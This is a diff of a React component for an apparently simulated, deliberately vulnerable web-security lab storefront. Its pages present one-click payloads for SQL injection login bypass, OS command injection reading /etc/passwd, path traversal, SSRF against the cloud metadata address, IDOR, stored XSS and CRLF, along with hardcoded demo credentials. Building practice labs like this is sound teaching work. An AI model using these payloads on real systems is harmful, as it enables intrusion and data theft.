-                            )}
-                          </div>
-                        </div>
-                      </div>
-                    </div>
-                  )}
-
-                  {/* ─────────────────────────────────────────────────────────────
-                      PAGE 4: AUTHENTICATION (SQL INJECTION LOGIN BYPASS)
+                      PAGE 4: SIGN IN / AUTHENTICATION (SQL INJECTION BYPASS)
                   ────────────────────────────────────────────────────────────── */}
                   {currentPage === "login" && (
                     <div className="max-w-md mx-auto space-y-6 py-4">
                       <div className="text-center space-y-1.5">
-                        <div className="mx-auto flex size-12 items-center justify-center rounded-2xl bg-cyan-500/10 text-cyan-400 text-xl shadow-inner">
+                        <div className="mx-auto flex size-12 items-center justify-center rounded-2xl bg-cyan-500/20 text-cyan-400 text-xl shadow-inner border border-cyan-500/30">
                           🔐
                         </div>
-                        <h2 className="text-lg font-bold text-foreground">Sign In to Apex CyberStore</h2>
-                        <p className="text-xs text-muted-foreground">
-                          Access your organization's security appliances & dashboard
+                        <h2 className="text-lg font-bold text-white">Sign In to Apex CyberStore</h2>
+                        <p className="text-xs text-slate-400">
+                          Authenticate your session to unlock customer orders and executive tools
                         </p>
                       </div>
 
@@ -1727,207 +1760,401 @@ export function WebLabTab({
                           const pword = (form.elements.namedItem("pword") as HTMLInputElement).value;
                           handleLoginSubmit(uname, pword);
                         }}
-                        className="rounded-2xl border border-border/50 bg-card/60 p-5 space-y-4 shadow-xl"
+                        className="rounded-2xl border border-slate-800 bg-[#0d1424] p-5 space-y-4 shadow-xl"
                       >
                         <div>
-                          <label className="block text-[11px] font-bold text-foreground/80 mb-1">
+                          <label className="block text-[11px] font-bold text-slate-300 mb-1">
                             Username / Email
                           </label>
                           <Input
                             name="uname"
                             defaultValue="admin'--"
-                            placeholder="admin or enter SQLi payload"
-                            className="h-9 font-mono text-xs bg-background/80"
+                            placeholder="admin or enter SQLi bypass"
+                            className="h-9 font-mono text-xs bg-[#070b14] border-slate-700 text-white"
                           />
                         </div>
 
                         <div>
-                          <label className="block text-[11px] font-bold text-foreground/80 mb-1">Password</label>
+                          <label className="block text-[11px] font-bold text-slate-300 mb-1">Password</label>
                           <Input
                             name="pword"
                             type="password"
-                            defaultValue="password"
+                            defaultValue="password123"
                             placeholder="••••••••"
-                            className="h-9 font-mono text-xs bg-background/80"
+                            className="h-9 font-mono text-xs bg-[#070b14] border-slate-700 text-white"
                           />
                         </div>
 
                         <Button type="submit" className="w-full h-9 rounded-xl font-bold text-xs bg-cyan-500 text-black hover:bg-cyan-400">
-                          Authenticate Session →
+                          Sign In →
                         </Button>
                       </form>
 
-                      {/* SQL Injection Quick Exploit Launcher */}
-                      <div className="rounded-2xl border border-red-500/30 bg-red-500/[0.04] p-4 space-y-2.5">
+                      {/* 1-Click SQLi Login Bypass Vectors */}
+                      <div className="rounded-2xl border border-red-500/40 bg-red-950/20 p-4 space-y-2.5">
                         <p className="text-[10px] font-bold uppercase tracking-wider text-red-400 flex items-center gap-1.5">
-                          <Flame className="size-3.5" /> 1-Click SQLi Login Bypass Vectors:
+                          <Flame className="size-3.5" /> 1-Click SQL Injection Bypass:
                         </p>
                         <div className="flex flex-wrap gap-1.5">
                           {[
                             "admin'--",
                             "' OR '1'='1'--",
                             "admin'/*",
-                            "' UNION SELECT 1,'admin','pass'--",
                           ].map((payload) => (
                             <button
                               key={payload}
                               type="button"
                               onClick={() => handleLoginSubmit(payload, "any_pass")}
-                              className="rounded-md border border-red-500/30 bg-red-500/10 px-2 py-1 text-[10px] font-mono text-red-300 hover:bg-red-500/20 transition"
+                              className="rounded-md border border-red-500/40 bg-red-500/15 px-2 py-1 text-[10px] font-mono text-red-300 hover:bg-red-500/30 transition"
                             >
                               {payload}
                             </button>
                           ))}
                         </div>
                       </div>
+
+                      {/* Demo User Switcher */}
+                      <div className="rounded-2xl border border-slate-800 bg-[#0d1424] p-3 text-center space-y-2">
+                        <p className="text-[10px] font-bold text-slate-400 uppercase tracking-wider">
+                          Or Sign In with Demo Credentials:
+                        </p>
+                        <div className="flex flex-wrap justify-center gap-2">
+                          <button
+                            type="button"
+                            onClick={() => handleLoginSubmit("admin", "admin123")}
+                            className="rounded-lg border border-slate-700 bg-slate-800 px-2.5 py-1 text-xs text-white hover:border-cyan-400"
+                          >
+                            👑 Admin (admin/admin123)
+                          </button>
+                          <button
+                            type="button"
+                            onClick={() => handleLoginSubmit("jsmith", "password")}
+                            className="rounded-lg border border-slate-700 bg-slate-800 px-2.5 py-1 text-xs text-white hover:border-cyan-400"
+                          >
+                            💻 Developer (jsmith/password)
+                          </button>
+                          <button
+                            type="button"
+                            onClick={() => handleLoginSubmit("customer", "customer123")}
+                            className="rounded-lg border border-slate-700 bg-slate-800 px-2.5 py-1 text-xs text-white hover:border-cyan-400"
+                          >
+                            👤 Customer (customer/customer123)
+                          </button>
+                        </div>
+                      </div>
                     </div>
                   )}
 
                   {/* ─────────────────────────────────────────────────────────────
-                      PAGE 5: DIAGNOSTICS & SYSTEM DEV TOOLS (RCE / LFI / SSRF)
+                      PAGE 5: ORDERS & CART (IDOR ORDER LOOKUP)
                   ────────────────────────────────────────────────────────────── */}
-                  {currentPage === "tools" && (
+                  {currentPage === "cart" && (
+                    <div className="space-y-6">
+                      <h2 className="text-lg font-bold text-white flex items-center gap-2">
+                        <ShoppingCart className="size-5 text-cyan-400" />
+                        Customer Orders & Invoices (IDOR Lab)
+                      </h2>
+
+                      <div className="grid grid-cols-1 md:grid-cols-12 gap-6 items-start">
+                        {/* Cart Items */}
+                        <div className="md:col-span-6 rounded-2xl border border-slate-800 bg-[#0d1424] p-5 space-y-3">
+                          <h3 className="text-xs font-bold uppercase tracking-wider text-slate-400">
+                            Active Shopping Cart ({cart.length} items)
+                          </h3>
+                          {cart.map((item, idx) => (
+                            <div key={idx} className="flex justify-between items-center border-b border-slate-800 pb-2.5">
+                              <div className="flex items-center gap-2.5">
+                                <span className="text-2xl p-1.5 rounded-lg bg-slate-800">{item.product.icon}</span>
+                                <div>
+                                  <p className="text-xs font-bold text-white">{item.product.name}</p>
+                                  <p className="text-[10px] text-slate-400">Qty: {item.quantity}</p>
+                                </div>
+                              </div>
+                              <span className="font-mono font-bold text-xs text-cyan-400">
+                                ${(item.product.price * item.quantity).toFixed(2)}
+                              </span>
+                            </div>
+                          ))}
+                          <div className="pt-2 flex justify-between items-center text-xs">
+                            <span className="font-bold text-white">Subtotal:</span>
+                            <span className="font-mono font-black text-sm text-cyan-300">${cartTotal.toFixed(2)}</span>
+                          </div>
+                        </div>
+
+                        {/* IDOR Order Lookup */}
+                        <div className="md:col-span-6 rounded-2xl border border-red-500/40 bg-red-950/20 p-5 space-y-3">
+                          <div className="flex items-center gap-2">
+                            <span className="text-lg">🔓</span>
+                            <div>
+                              <h3 className="text-xs font-bold text-red-300 uppercase tracking-wider">
+                                Track Order by ID (IDOR Vulnerability)
+                              </h3>
+                              <p className="text-[10px] text-slate-400">
+                                Change Order ID to view other users' confidential receipts.
+                              </p>
+                            </div>
+                          </div>
+
+                          <div className="flex gap-2">
+                            <Input
+                              value={orderLookupId}
+                              onChange={(e) => setOrderLookupId(e.target.value)}
+                              placeholder="Order ID"
+                              className="h-9 font-mono text-xs bg-[#070b14] border-slate-700 text-white"
+                            />
+                            <Button
+                              size="sm"
+                              onClick={() => handleOrderLookup(orderLookupId)}
+                              className="h-9 px-4 text-xs font-bold bg-red-500/20 text-red-300 border border-red-500/40 hover:bg-red-500/30"
+                            >
+                              Fetch Order
+                            </Button>
+                          </div>
+
+                          <div className="flex flex-wrap gap-1.5">
+                            {["1001 (My Order)", "1002 (CFO VIP)", "1003 (Director)", "1004 (DBA)"].map((opt) => {
+                              const idOnly = opt.split(" ")[0];
+                              return (
+                                <button
+                                  key={opt}
+                                  type="button"
+                                  onClick={() => {
+                                    setOrderLookupId(idOnly);
+                                    handleOrderLookup(idOnly);
+                                  }}
+                                  className="rounded border border-red-500/40 bg-red-500/10 px-2 py-0.5 text-[9px] font-mono text-red-300 hover:bg-red-500/20"
+                                >
+                                  ID: {opt}
+                                </button>
+                              );
+                            })}
+                          </div>
+
+                          {/* Looked Up Order Result */}
+                          {lookedUpOrder && (
+                            <div
+                              className={cn(
+                                "rounded-xl border p-3 text-xs space-y-1.5 font-mono",
+                                lookedUpOrder.isConfidential
+                                  ? "border-red-500/60 bg-red-950/60 text-red-200"
+                                  : "border-slate-700 bg-[#070b14] text-slate-200"
+                              )}
+                            >
+                              <div className="flex justify-between items-center border-b border-slate-700 pb-1">
+                                <span className="font-bold">INVOICE #{lookedUpOrder.id}</span>
+                                <span className="rounded bg-emerald-500/20 text-emerald-300 px-1.5 py-0.2 text-[9px]">
+                                  {lookedUpOrder.status}
+                                </span>
+                              </div>
+                              <p>Customer: {lookedUpOrder.customerName}</p>
+                              <p>Email: {lookedUpOrder.email}</p>
+                              <p>Card: ****-****-****-{lookedUpOrder.cardLast4}</p>
+                              <p className="font-bold text-cyan-300">Total: ${lookedUpOrder.total.toFixed(2)}</p>
+                              {lookedUpOrder.isConfidential && (
+                                <p className="text-[9px] font-bold text-red-400 bg-red-500/20 p-1 rounded border border-red-500/30">
+                                  ⚠️ IDOR EXPLOITED: Accessed unauthorized executive billing records!
+                                </p>
+                              )}
+                            </div>
+                          )}
+                        </div>
+                      </div>
+                    </div>
+                  )}
+
+                  {/* ─────────────────────────────────────────────────────────────
+                      PAGE 6: USER DASHBOARD
+                  ────────────────────────────────────────────────────────────── */}
+                  {currentPage === "dashboard" && currentUser && (
+                    <div className="space-y-6">
+                      <div className="flex items-center justify-between">
+                        <div className="flex items-center gap-3">
+                          <span className="text-4xl p-2.5 rounded-2xl bg-cyan-500/20 border border-cyan-500/30">
+                            {currentUser.avatar}
+                          </span>
+                          <div>
+                            <h2 className="text-lg font-bold text-white">{currentUser.name}</h2>
+                            <p className="text-xs text-slate-400">
+                              {currentUser.role} · {currentUser.department}
+                            </p>
+                          </div>
+                        </div>
+
+                        {currentUser.role.includes("Admin") && (
+                          <Button
+                            size="sm"
+                            onClick={() => navigateTo("admin")}
+                            className="h-8 text-xs font-bold rounded-xl bg-amber-500/20 text-amber-300 border border-amber-500/40 hover:bg-amber-500/30"
+                          >
+                            <Unlock className="size-3.5 mr-1" /> Open Admin Vault
+                          </Button>
+                        )}
+                      </div>
+
+                      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
+                        {[
+                          { label: "Assigned Tokens", value: "3 FIDO2 Keys", icon: <Key className="size-4 text-cyan-400" /> },
+                          { label: "Security Posture", value: "99 / 100", icon: <ShieldCheck className="size-4 text-emerald-400" /> },
+                          { label: "API Requests", value: "18,492 reqs", icon: <TrendingUp className="size-4 text-violet-400" /> },
+                          { label: "Attack Intercepts", value: "349 blocked", icon: <Shield className="size-4 text-amber-400" /> },
+                        ].map((s, idx) => (
+                          <div key={idx} className="rounded-2xl border border-slate-800 bg-[#0d1424] p-3.5 space-y-1">
+                            <div className="flex items-center justify-between">
+                              <span className="text-[10px] text-slate-400 font-medium">{s.label}</span>
+                              {s.icon}
+                            </div>
+                            <p className="font-mono font-bold text-base text-white">{s.value}</p>
+                          </div>
+                        ))}
+                      </div>
+
+                      <div className="rounded-2xl border border-slate-800 bg-[#0d1424] p-5 space-y-3">
+                        <h3 className="text-xs font-bold uppercase tracking-wider text-slate-400">
+                          Active API Keys & Environment Tokens
+                        </h3>
+                        <div className="rounded-xl bg-[#070b14] border border-slate-700 p-3 font-mono text-xs flex justify-between items-center">
+                          <div>
+                            <p className="text-[10px] text-slate-400">Assigned Master Token:</p>
+                            <p className="text-cyan-300 font-bold">{currentUser.apiKeys}</p>
+                          </div>
+                          <Button
+                            size="sm"
+                            variant="ghost"
+                            onClick={() => toast.success("Token copied")}
+                            className="h-7 text-xs text-slate-300 hover:text-white"
+                          >
+                            <Copy className="size-3" />
+                          </Button>
+                        </div>
+                      </div>
+                    </div>
+                  )}
+
+                  {/* ─────────────────────────────────────────────────────────────
+                      PAGE 7: SYSTEM DIAGNOSTICS (CMDI / LFI / SSRF)
+                  ────────────────────────────────────────────────────────────── */}
+                  {currentPage === "diagnostics" && (
                     <div className="space-y-6">
                       <div>
-                        <h2 className="text-lg font-bold text-foreground flex items-center gap-2">
-                          <Wrench className="size-5 text-cyan-400" />
-                          System Diagnostics & Server Utility Console
+                        <h2 className="text-lg font-bold text-white flex items-center gap-2">
+                          <Wrench className="size-5 text-emerald-400" /> System Diagnostics Console (RCE / LFI / SSRF)
                         </h2>
-                        <p className="text-xs text-muted-foreground mt-0.5">
+                        <p className="text-xs text-slate-400 mt-0.5">
                           Internal developer utilities used to diagnose network connectivity, file storage, and webhook
                           integrations.
                         </p>
                       </div>
 
-                      <div className="grid grid-cols-1 md:grid-cols-3 gap-5">
-                        {/* 1. Network Health Ping (Command Injection CMDi) */}
-                        <div className="rounded-2xl border border-border/50 bg-card/60 p-4 space-y-3 flex flex-col justify-between">
+                      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+                        {/* 1. Network Ping Tool (CMDi) */}
+                        <div className="rounded-2xl border border-slate-800 bg-[#0d1424] p-4 flex flex-col justify-between space-y-3">
                           <div>
                             <div className="flex items-center gap-2 mb-1">
                               <Terminal className="size-4 text-emerald-400" />
-                              <h3 className="text-xs font-bold text-foreground uppercase">1. Network Ping Tool</h3>
+                              <h3 className="text-xs font-bold text-white uppercase">1. Ping Tool (CMDi)</h3>
                             </div>
-                            <p className="text-[10px] text-muted-foreground">
-                              Executes system ping on target IP. Vulnerable to OS Command Injection.
-                            </p>
                             <Input
                               value={pingHost}
                               onChange={(e) => setPingHost(e.target.value)}
-                              className="mt-2 h-8 font-mono text-xs bg-background/80"
-                              placeholder="8.8.8.8; whoami"
+                              className="h-8 font-mono text-xs bg-[#070b14] border-slate-700 text-white"
                             />
                             <div className="mt-2 flex flex-wrap gap-1">
-                              {["8.8.8.8; whoami", "127.0.0.1 && cat /etc/passwd", "127.0.0.1 | dir"].map((p) => (
+                              {["8.8.8.8; whoami", "127.0.0.1 && cat /etc/passwd"].map((p) => (
                                 <button
                                   key={p}
                                   type="button"
                                   onClick={() => handlePingExecute(p)}
-                                  className="rounded border border-red-500/30 bg-red-500/10 px-1.5 py-0.5 text-[9px] font-mono text-red-300 hover:bg-red-500/20"
+                                  className="rounded border border-red-500/40 bg-red-500/15 px-1.5 py-0.5 text-[9px] font-mono text-red-300 hover:bg-red-500/25"
                                 >
                                   {p}
                                 </button>
                               ))}
                             </div>
                           </div>
-
                           <Button
                             size="sm"
                             onClick={() => handlePingExecute(pingHost)}
-                            className="w-full h-8 text-xs font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 hover:bg-emerald-500/30 mt-2"
+                            className="w-full h-8 text-xs font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 hover:bg-emerald-500/30"
                           >
                             Execute Ping
                           </Button>
                         </div>
 
-                        {/* 2. System Report Viewer (Path Traversal / LFI) */}
-                        <div className="rounded-2xl border border-border/50 bg-card/60 p-4 space-y-3 flex flex-col justify-between">
+                        {/* 2. File Downloader (Path Traversal) */}
+                        <div className="rounded-2xl border border-slate-800 bg-[#0d1424] p-4 flex flex-col justify-between space-y-3">
                           <div>
                             <div className="flex items-center gap-2 mb-1">
                               <FileCode className="size-4 text-cyan-400" />
-                              <h3 className="text-xs font-bold text-foreground uppercase">2. Report File Viewer</h3>
+                              <h3 className="text-xs font-bold text-white uppercase">2. Report Viewer (LFI)</h3>
                             </div>
-                            <p className="text-[10px] text-muted-foreground">
-                              Downloads log files by relative path. Vulnerable to Path Traversal.
-                            </p>
                             <Input
                               value={traversalPath}
                               onChange={(e) => setTraversalPath(e.target.value)}
-                              className="mt-2 h-8 font-mono text-xs bg-background/80"
-                              placeholder="../../../../etc/passwd"
+                              className="h-8 font-mono text-xs bg-[#070b14] border-slate-700 text-white"
                             />
                             <div className="mt-2 flex flex-wrap gap-1">
-                              {["../../../../etc/passwd", "..\\..\\windows\\win.ini", "../../db.conf"].map((p) => (
+                              {["../../../../etc/passwd", "..\\..\\windows\\win.ini"].map((p) => (
                                 <button
                                   key={p}
                                   type="button"
                                   onClick={() => handleTraversalExecute(p)}
-                                  className="rounded border border-red-500/30 bg-red-500/10 px-1.5 py-0.5 text-[9px] font-mono text-red-300 hover:bg-red-500/20"
+                                  className="rounded border border-red-500/40 bg-red-500/15 px-1.5 py-0.5 text-[9px] font-mono text-red-300 hover:bg-red-500/25"
                                 >
                                   {p}
                                 </button>
                               ))}
                             </div>
                           </div>
-
                           <Button
                             size="sm"
                             onClick={() => handleTraversalExecute(traversalPath)}
-                            className="w-full h-8 text-xs font-bold bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 hover:bg-cyan-500/30 mt-2"
+                            className="w-full h-8 text-xs font-bold bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 hover:bg-cyan-500/30"
                           >
                             Fetch Report File
                           </Button>
                         </div>
 
-                        {/* 3. Webhook Verifier (SSRF) */}
-                        <div className="rounded-2xl border border-border/50 bg-card/60 p-4 space-y-3 flex flex-col justify-between">
+                        {/* 3. Webhook Tester (SSRF) */}
+                        <div className="rounded-2xl border border-slate-800 bg-[#0d1424] p-4 flex flex-col justify-between space-y-3">
                           <div>
                             <div className="flex items-center gap-2 mb-1">
                               <Globe2 className="size-4 text-violet-400" />
-                              <h3 className="text-xs font-bold text-foreground uppercase">3. Webhook URL Tester</h3>
+                              <h3 className="text-xs font-bold text-white uppercase">3. Webhook (SSRF)</h3>
                             </div>
-                            <p className="text-[10px] text-muted-foreground">
-                              Backend fetches URL callback. Vulnerable to SSRF (Cloud Metadata).
-                            </p>
                             <Input
                               value={webhookUrl}
                               onChange={(e) => setWebhookUrl(e.target.value)}
-                              className="mt-2 h-8 font-mono text-xs bg-background/80"
-                              placeholder="http://169.254.169.254/..."
+                              className="h-8 font-mono text-xs bg-[#070b14] border-slate-700 text-white"
                             />
                             <div className="mt-2 flex flex-wrap gap-1">
-                              {[
-                                "http://169.254.169.254/latest/meta-data/",
-                                "http://127.0.0.1:8080/admin",
-                                "http://localhost:6379/",
-                              ].map((p) => (
+                              {["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:8080/admin"].map((p) => (
                                 <button
                                   key={p}
                                   type="button"
                                   onClick={() => handleWebhookExecute(p)}
-                                  className="rounded border border-red-500/30 bg-red-500/10 px-1.5 py-0.5 text-[9px] font-mono text-red-300 hover:bg-red-500/20"
+                                  className="rounded border border-red-500/40 bg-red-500/15 px-1.5 py-0.5 text-[9px] font-mono text-red-300 hover:bg-red-500/25"
                                 >
-                                  {p.slice(0, 22)}...
+                                  {p.slice(0, 20)}...
                                 </button>
                               ))}
                             </div>
                           </div>
-
                           <Button
                             size="sm"
                             onClick={() => handleWebhookExecute(webhookUrl)}
-                            className="w-full h-8 text-xs font-bold bg-violet-500/20 text-violet-300 border border-violet-500/30 hover:bg-violet-500/30 mt-2"
+                            className="w-full h-8 text-xs font-bold bg-violet-500/20 text-violet-300 border border-violet-500/40 hover:bg-violet-500/30"
                           >
-                            Verify Webhook URL
+                            Verify Webhook
                           </Button>
                         </div>
                       </div>
 
-                      {/* Diagnostic Outputs Terminal Box */}
+                      {/* Server Output Console */}
                       {(pingOutput || traversalOutput || webhookOutput) && (
-                        <div className="rounded-2xl border border-border/60 bg-[#090d16] p-4 font-mono text-xs shadow-xl space-y-2">
-                          <div className="flex items-center justify-between border-b border-border/40 pb-2">
+                        <div className="rounded-2xl border border-slate-700 bg-[#050811] p-4 font-mono text-xs space-y-2">
+                          <div className="flex justify-between items-center border-b border-slate-800 pb-1.5">
                             <span className="text-cyan-400 font-bold flex items-center gap-1.5">
-                              <Terminal className="size-3.5" /> Backend Server Standard Output
+                              <Terminal className="size-3.5" /> Backend Server Output
                             </span>
                             <button
                               type="button"
@@ -1936,7 +2163,7 @@ export function WebLabTab({
                                 setTraversalOutput(null);
                                 setWebhookOutput(null);
                               }}
-                              className="text-muted-foreground hover:text-foreground text-[10px]"
+                              className="text-slate-400 hover:text-white text-[10px]"
                             >
                               Clear
                             </button>
@@ -1950,117 +2177,45 @@ export function WebLabTab({
                   )}
 
                   {/* ─────────────────────────────────────────────────────────────
-                      PAGE 6: USER DASHBOARD
-                  ────────────────────────────────────────────────────────────── */}
-                  {currentPage === "dashboard" && (
-                    <div className="space-y-6">
-                      <div className="flex items-center justify-between">
-                        <div className="flex items-center gap-3">
-                          <span className="text-4xl p-2 rounded-2xl bg-cyan-500/15 border border-cyan-500/30">
-                            {currentUser?.avatar || "👤"}
-                          </span>
-                          <div>
-                            <h2 className="text-lg font-bold text-foreground">
-                              {currentUser ? currentUser.name : "Guest User"}
-                            </h2>
-                            <p className="text-xs text-muted-foreground">
-                              {currentUser?.role || "Visitor"} · {currentUser?.department || "External"}
-                            </p>
-                          </div>
-                        </div>
-
-                        <Button
-                          size="sm"
-                          variant="outline"
-                          onClick={() => navigateTo("tools")}
-                          className="h-8 text-xs font-semibold rounded-xl"
-                        >
-                          <Wrench className="size-3.5 mr-1" /> Dev Tools
-                        </Button>
-                      </div>
-
-                      {/* Stats Grid */}
-                      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
-                        {[
-                          { label: "Security Posture", value: "98/100", icon: <ShieldCheck className="size-4 text-emerald-400" /> },
-                          { label: "Active Tokens", value: "3 Hardware Keys", icon: <Key className="size-4 text-cyan-400" /> },
-                          { label: "SOC Requests (24h)", value: "18,492", icon: <TrendingUp className="size-4 text-violet-400" /> },
-                          { label: "Threats Blocked", value: "349 Attacks", icon: <Shield className="size-4 text-amber-400" /> },
-                        ].map((stat, idx) => (
-                          <div key={idx} className="rounded-2xl border border-border/50 bg-card/60 p-3.5 space-y-1">
-                            <div className="flex items-center justify-between">
-                              <span className="text-[10px] text-muted-foreground font-medium">{stat.label}</span>
-                              {stat.icon}
-                            </div>
-                            <p className="font-mono font-bold text-base text-foreground">{stat.value}</p>
-                          </div>
-                        ))}
-                      </div>
-
-                      {/* User Secret Keys & Settings */}
-                      <div className="rounded-2xl border border-border/50 bg-card/60 p-5 space-y-3">
-                        <h3 className="text-xs font-bold uppercase tracking-wider text-muted-foreground">
-                          Assigned API Credentials & Environment Secrets
-                        </h3>
-                        <div className="rounded-xl bg-muted/30 border border-border/40 p-3 font-mono text-xs flex justify-between items-center">
-                          <div>
-                            <p className="text-[10px] text-muted-foreground">API Master Key:</p>
-                            <p className="text-cyan-300 font-bold">{currentUser?.apiKeys || "sk_live_public_demo_guest"}</p>
-                          </div>
-                          <Button
-                            size="sm"
-                            variant="ghost"
-                            onClick={() => toast.success("API key copied to clipboard")}
-                            className="h-7 text-xs"
-                          >
-                            <Copy className="size-3" />
-                          </Button>
-                        </div>
-                      </div>
-                    </div>
-                  )}
-
-                  {/* ─────────────────────────────────────────────────────────────
-                      PAGE 7: RESTRICTED ADMIN CONSOLE (ACCESSIBLE VIA SQLI / PRIV ESC)
+                      PAGE 8: ADMIN CONSOLE & SECRETS VAULT
                   ────────────────────────────────────────────────────────────── */}
                   {currentPage === "admin" && (
                     <div className="space-y-6">
-                      <div className="rounded-2xl border border-amber-500/40 bg-amber-500/[0.06] p-5">
+                      <div className="rounded-2xl border border-amber-500/50 bg-amber-950/30 p-5">
                         <div className="flex items-center gap-3">
                           <span className="text-3xl">👑</span>
                           <div>
                             <h2 className="text-base font-extrabold text-amber-300">
-                              Restricted Executive Admin Console
+                              Executive Admin Vault & User Directory
                             </h2>
-                            <p className="text-xs text-muted-foreground">
-                              Confidential database tables, encryption keys, and system user management.
+                            <p className="text-xs text-slate-300">
+                              Confidential database user credentials and master encryption keys.
                             </p>
                           </div>
                         </div>
                       </div>
 
-                      {/* User Database Table */}
-                      <div className="rounded-2xl border border-border/50 bg-card/60 p-5 space-y-3">
-                        <h3 className="text-xs font-bold uppercase tracking-wider text-muted-foreground">
-                          Internal User Accounts & Password Hashes
+                      <div className="rounded-2xl border border-slate-800 bg-[#0d1424] p-5 space-y-3">
+                        <h3 className="text-xs font-bold uppercase tracking-wider text-slate-400">
+                          Internal User Database (Password Hashes & Tokens)
                         </h3>
                         <div className="overflow-x-auto">
                           <table className="w-full text-left text-xs">
                             <thead>
-                              <tr className="border-b border-border/40 text-muted-foreground text-[10px] uppercase font-bold">
+                              <tr className="border-b border-slate-800 text-slate-400 text-[10px] uppercase font-bold">
                                 <th className="py-2">User</th>
                                 <th className="py-2">Email</th>
                                 <th className="py-2">Role</th>
                                 <th className="py-2">API Secret</th>
                               </tr>
                             </thead>
-                            <tbody className="divide-y divide-border/20 font-mono text-[11px]">
+                            <tbody className="divide-y divide-slate-800 font-mono text-[11px]">
                               {FAKE_USERS.map((u, i) => (
-                                <tr key={i} className="hover:bg-muted/30">
-                                  <td className="py-2 font-bold text-foreground">
+                                <tr key={i} className="hover:bg-slate-800/40">
+                                  <td className="py-2 font-bold text-white">
                                     {u.avatar} {u.username}
                                   </td>
-                                  <td className="py-2 text-muted-foreground">{u.email}</td>
+                                  <td className="py-2 text-slate-400">{u.email}</td>
                                   <td className="py-2 text-cyan-300">{u.role}</td>
                                   <td className="py-2 text-amber-300">{u.apiKeys}</td>
                                 </tr>
@@ -2073,15 +2228,13 @@ export function WebLabTab({
                   )}
 
                   {/* ─────────────────────────────────────────────────────────────
-                      PAGE 8: SUPPORT DESK & TICKET CONTACT (STORED XSS / CRLF)
+                      PAGE 9: SUPPORT DESK (STORED XSS / CRLF)
                   ────────────────────────────────────────────────────────────── */}
                   {currentPage === "contact" && (
                     <div className="max-w-xl mx-auto space-y-6 py-2">
                       <div className="text-center space-y-1">
-                        <h2 className="text-lg font-bold text-foreground">Submit Security Support Ticket</h2>
-                        <p className="text-xs text-muted-foreground">
-                          Contact our 24/7 Security Operations Center team
-                        </p>
+                        <h2 className="text-lg font-bold text-white">Submit Support Ticket</h2>
+                        <p className="text-xs text-slate-400">Contact our 24/7 Security Operations Center</p>
                       </div>
 
                       <form
@@ -2101,82 +2254,76 @@ export function WebLabTab({
                             isXss ? "stored-xss" : isCrlf ? "email-injection" : undefined
                           );
                         }}
-                        className="rounded-2xl border border-border/50 bg-card/60 p-5 space-y-3.5 shadow-xl"
+                        className="rounded-2xl border border-slate-800 bg-[#0d1424] p-5 space-y-3.5 shadow-xl"
                       >
                         <div className="grid grid-cols-2 gap-3">
                           <div>
-                            <label className="block text-[11px] font-bold text-foreground/80 mb-1">Your Name</label>
+                            <label className="block text-[11px] font-bold text-slate-300 mb-1">Your Name</label>
                             <Input
                               value={contactName}
                               onChange={(e) => setContactName(e.target.value)}
-                              className="h-9 text-xs font-mono bg-background/80"
+                              className="h-9 text-xs font-mono bg-[#070b14] border-slate-700 text-white"
                             />
                           </div>
                           <div>
-                            <label className="block text-[11px] font-bold text-foreground/80 mb-1">
-                              Email Address (CRLF Vector)
+                            <label className="block text-[11px] font-bold text-slate-300 mb-1">
+                              Email (CRLF Injection Vector)
                             </label>
                             <Input
                               value={contactEmail}
                               onChange={(e) => setContactEmail(e.target.value)}
-                              className="h-9 text-xs font-mono bg-background/80"
+                              className="h-9 text-xs font-mono bg-[#070b14] border-slate-700 text-white"
                             />
                           </div>
                         </div>
 
                         <div>
-                          <label className="block text-[11px] font-bold text-foreground/80 mb-1">Subject</label>
+                          <label className="block text-[11px] font-bold text-slate-300 mb-1">Subject</label>
                           <Input
                             value={contactSubject}
                             onChange={(e) => setContactSubject(e.target.value)}
-                            className="h-9 text-xs bg-background/80"
+                            className="h-9 text-xs bg-[#070b14] border-slate-700 text-white"
                           />
                         </div>
 
                         <div>
-                          <label className="block text-[11px] font-bold text-foreground/80 mb-1">
-                            Message Body (Stored XSS Vector)
+                          <label className="block text-[11px] font-bold text-slate-300 mb-1">
+                            Message (Stored XSS Vector)
                           </label>
                           <Textarea
                             value={contactMessage}
                             onChange={(e) => setContactMessage(e.target.value)}
-                            className="min-h-24 text-xs font-mono bg-background/80 resize-none"
+                            className="min-h-24 text-xs font-mono bg-[#070b14] border-slate-700 text-white resize-none"
                           />
                         </div>
 
                         <Button type="submit" className="w-full h-9 rounded-xl font-bold text-xs bg-cyan-500 text-black hover:bg-cyan-400">
-                          Submit Support Ticket →
+                          Submit Ticket →
                         </Button>
                       </form>
                     </div>
                   )}
 
                   {/* ─────────────────────────────────────────────────────────────
-                      PAGE 9: KNOWLEDGE BASE / SEARCH (REFLECTED XSS)
+                      PAGE 10: KNOWLEDGE BASE & DOCS
                   ────────────────────────────────────────────────────────────── */}
-                  {currentPage === "search" && (
+                  {currentPage === "docs" && (
                     <div className="space-y-6">
                       <div className="text-center space-y-1.5 max-w-md mx-auto">
-                        <h2 className="text-lg font-bold text-foreground">Knowledge Base & Threat Docs</h2>
-                        <p className="text-xs text-muted-foreground">Search across security guidelines and articles</p>
-                        <Input
-                          value={searchQuery}
-                          onChange={(e) => handleStoreSearch(e.target.value)}
-                          placeholder="Search docs or enter Reflected XSS payload..."
-                          className="h-9 font-mono text-xs bg-muted/40"
-                        />
+                        <h2 className="text-lg font-bold text-white">Knowledge Base & Security Docs</h2>
+                        <p className="text-xs text-slate-400">Search technical integration guides</p>
                       </div>
 
                       <div className="space-y-3">
                         {DOC_ARTICLES.map((doc) => (
-                          <div key={doc.id} className="rounded-2xl border border-border/50 bg-card/60 p-4 space-y-1">
+                          <div key={doc.id} className="rounded-2xl border border-slate-800 bg-[#0d1424] p-4 space-y-1">
                             <div className="flex justify-between items-center">
                               <h3 className="text-xs font-bold text-cyan-400">{doc.title}</h3>
-                              <span className="rounded bg-muted px-2 py-0.5 text-[9px] font-semibold text-muted-foreground">
+                              <span className="rounded bg-slate-800 px-2 py-0.5 text-[9px] font-semibold text-slate-300">
                                 {doc.category}
                               </span>
                             </div>
-                            <p className="text-xs text-muted-foreground">{doc.snippet}</p>
